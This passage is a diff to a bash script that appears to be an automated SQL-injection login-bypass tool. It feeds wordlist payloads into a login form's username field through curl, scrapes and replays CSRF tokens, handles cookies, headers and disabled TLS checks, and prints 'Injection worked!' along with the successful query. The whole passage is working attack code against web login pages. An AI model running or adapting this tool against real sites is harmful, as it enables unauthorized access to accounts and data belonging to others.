+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+          
+      response=$(echo -e $REQUEST > response.txt)
+      
     # Cookie is set with other arguments
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
       
-      REQUEST=$(curl -s -v 2>/tmp/curl-temp.txt -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
-
-      if [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-
-      elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      REQUEST=$(curl -D headers.txt -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
+    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
+    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+          
+      response=$(echo -e $REQUEST > response.txt)
       
     elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" == 'true' ]; then
       
-      REQUEST=$(curl -s -k -v 2>/tmp/curl-temp.txt -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
-
-    fi
+      REQUEST=$(curl -D headers.txt -s -k -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
 
     # CSRF is true with other arguments
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
         
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+        CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
         
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+        CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
         
-        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
-        #echo "$REQUEST"
+        REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
+              
+        response=$(echo -e $REQUEST > response.txt)
 
 
-      if [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
       
-      fi
-
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
     # Only SSL is TRUE
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
       
-      REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
+      REQUEST=$(curl -D headers.txt -s -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
 
     else
 
-      REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
-
-  fi
+      REQUEST=$(curl -D headers.txt -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
+    fi
 
 
   # Response check
-  final_request=$(echo $REQUEST)
-  status_code=`cat /tmp/curl-temp.txt | grep "200 OK"`
-  
+  status_code=`cat "headers.txt"`
+  match_response=$(cat "response.txt" | grep -i "$ERROR")
 
-  if [[ $VERBOSE == '-v' ]] && [[ "$final_request" != *"$ERROR"* ]] && [[ $final_request == *"200 OK"* ]];then
+  if [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]] && [[ $status_code == *"200 OK"* ]];then
     
     # Success!
     echo -e "[*] Injection worked!"
-    echo "[*] SQL Query in Username field is: ${wordlist}"
+    echo -e "[*] SQL Query in Username field is: ${wordlist}"
     printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
     break 2
 
-  elif [[ "$final_request" != *"$ERROR"* ]] && [[ "$status_code" == *"200 OK"* ]] && [[ $VERBOSE == '' ]]; then
+  elif [[ "$match_response" != *"$ERROR"* ]] && [[ "$status_code" == *"200"* ]] && [[ $VERBOSE == '' ]]; then
 
     # Success!
     echo -e "[*] Injection worked!"
-    echo "[*] SQL Query in Username field is: ${wordlist}"
+    echo -e "[*] SQL Query in Username field is: ${wordlist}"
     printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
     break 2
 
-  elif [[ "$status_code" != *"200 OK"* ]]; then
-    echo "Server didn't respond with 200 code!"
-    echo "Please check the URL!"
-    echo $final_request
+  elif [[ "$status_code" != *"200"* ]]; then
+    echo -e "Server didn't respond with 200 code!"
+    echo -e "Please check the URL!"
+    echo -e $match_response
     exit
 
   fi
